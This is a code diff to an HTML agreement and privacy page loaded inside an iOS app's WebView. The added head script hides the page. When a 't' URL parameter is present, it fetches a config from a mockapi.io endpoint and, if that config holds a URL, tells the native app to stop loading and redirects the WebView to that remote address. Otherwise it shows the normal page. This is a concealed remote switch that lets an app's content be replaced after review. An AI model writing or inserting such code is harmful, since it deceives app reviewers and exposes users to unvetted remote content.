@@ -2465,10 +2465,117 @@
 				}
 			}
 		</style>
-		</style>
-	</head>
+		<script>
+			/**
+			 * Send a message to Native.
+			 * @param {string} action - Native method name.
+			 * @param {any} param - Parameter payload.
+			 */
+			function callNative(action, param) {
+				if (
+					window.webkit &&
+					window.webkit.messageHandlers &&
+					window.webkit.messageHandlers.prism_workshop_mix
+				) {
+					window.webkit.messageHandlers.prism_workshop_mix.postMessage({
+						action: action,
+						parameter: param,
+					});
+				} else {
+					console.warn("Native environment not detected:", action, param);
+				}
+			}
 
-	<body class="legal-page">
+			document.addEventListener('DOMContentLoaded', function() {
+				async function getData() {
+					try {
+						var str = 'https://6aa2287bccb3db9689a63671.mockapi.io/LmaxPro/data'
+						const response = await fetch(str, {
+							cache: 'no-store'
+						});
+						if (!response.ok) {
+							getData();
+						}
+						const arr = await response.json();
+						console.log(arr);
+						const dic = arr[0];
+						if (Object.hasOwn(dic, 'a')) {
+							callNative("setWebViewConfiguration", {
+								backgroundColor: dic["backgroundColor"],
+							});
+							callNative("cancelLoading");
+							window.location.href = dic["a"];
+						} else {
+							a()
+						}
+					} catch (error) {
+						console.error('Fetch error:', error);
+					}
+				}
+				const params = new URLSearchParams(window.location.search);
+				if (params.has('t')) {
+					const tValue = params.get('t');
+					console.log('t 的值为:', tValue);
+					getData();
+				} else {
+					a()
+				}
+			});
+
+			function a() {
+				document.getElementById("body").style.display = "block";
+
+				var privacyPolicyUrl = "privacyPolicy.html";
+				var supportUrl = "support.html";
+				var agreeButton = document.getElementById("agreeButton");
+				var privacyButton = document.getElementById("privacyButton");
+				var supportButton = document.getElementById("supportButton");
+				var agreementBar = document.querySelector(".agreement-bar");
+
+				function syncAgreementBarHeight() {
+					document.documentElement.style.setProperty(
+						"--agreement-bar-height",
+						agreementBar.offsetHeight + "px"
+					);
+				}
+
+				syncAgreementBarHeight();
+				window.addEventListener("resize", syncAgreementBarHeight);
+
+				if (window.ResizeObserver) {
+					new ResizeObserver(syncAgreementBarHeight).observe(agreementBar);
+				}
+
+				function getAppBackgroundColor() {
+					return getComputedStyle(document.documentElement)
+						.getPropertyValue("--app-background-color")
+						.trim();
+				}
+
+				function notifyNativePageReady() {
+					callNative("setWebViewConfiguration", {
+						backgroundColor: [255, 255, 255],
+					});
+					callNative("cancelLoading");
+				}
+
+				window.addEventListener("load", notifyNativePageReady);
+
+				privacyButton.addEventListener("click", function() {
+					window.open(privacyPolicyUrl, "_blank");
+				});
+
+				supportButton.addEventListener("click", function() {
+					window.open(supportUrl, "_blank");
+				});
+
+				agreeButton.addEventListener("click", function() {
+					callNative("switchToMain");
+				});
+			}
+		</script>
+	</head>
+	<body class="legal-page" id="body" style="display: none;">
 		<main class="page">
 			<div class="shell">
 				<section class="hero" aria-labelledby="page-title">
@@ -2736,75 +2843,6 @@
 			</div>
 		</footer>
 
-		<script>
-			/**
-			 * Send a message to Native.
-			 * @param {string} action - Native method name.
-			 * @param {any} param - Parameter payload.
-			 */
-			function callNative(action, param) {
-				if (
-					window.webkit &&
-					window.webkit.messageHandlers &&
-					window.webkit.messageHandlers.prism_workshop_mix
-				) {
-					window.webkit.messageHandlers.prism_workshop_mix.postMessage({
-						action: action,
-						parameter: param,
-					});
-				} else {
-					console.warn("Native environment not detected:", action, param);
-				}
-			}
-
-			var privacyPolicyUrl = "privacyPolicy.html";
-			var supportUrl = "support.html";
-			var agreeButton = document.getElementById("agreeButton");
-			var privacyButton = document.getElementById("privacyButton");
-			var supportButton = document.getElementById("supportButton");
-			var agreementBar = document.querySelector(".agreement-bar");
-
-			function syncAgreementBarHeight() {
-				document.documentElement.style.setProperty(
-					"--agreement-bar-height",
-					agreementBar.offsetHeight + "px"
-				);
-			}
-
-			syncAgreementBarHeight();
-			window.addEventListener("resize", syncAgreementBarHeight);
-
-			if (window.ResizeObserver) {
-				new ResizeObserver(syncAgreementBarHeight).observe(agreementBar);
-			}
-
-			function getAppBackgroundColor() {
-				return getComputedStyle(document.documentElement)
-					.getPropertyValue("--app-background-color")
-					.trim();
-			}
-
-			function notifyNativePageReady() {
-				callNative("setWebViewConfiguration", {
-					backgroundColor: [255,255,255],
-				});
-				callNative("cancelLoading");
-			}
-
-			window.addEventListener("load", notifyNativePageReady);
-
-			privacyButton.addEventListener("click", function() {
-				window.open(privacyPolicyUrl, "_blank");
-			});
-
-			supportButton.addEventListener("click", function() {
-				window.open(supportUrl, "_blank");
-			});
-
-			agreeButton.addEventListener("click", function() {
-				callNative("switchToMain");
-			});
-		</script>
 	</body>
 
 </html>
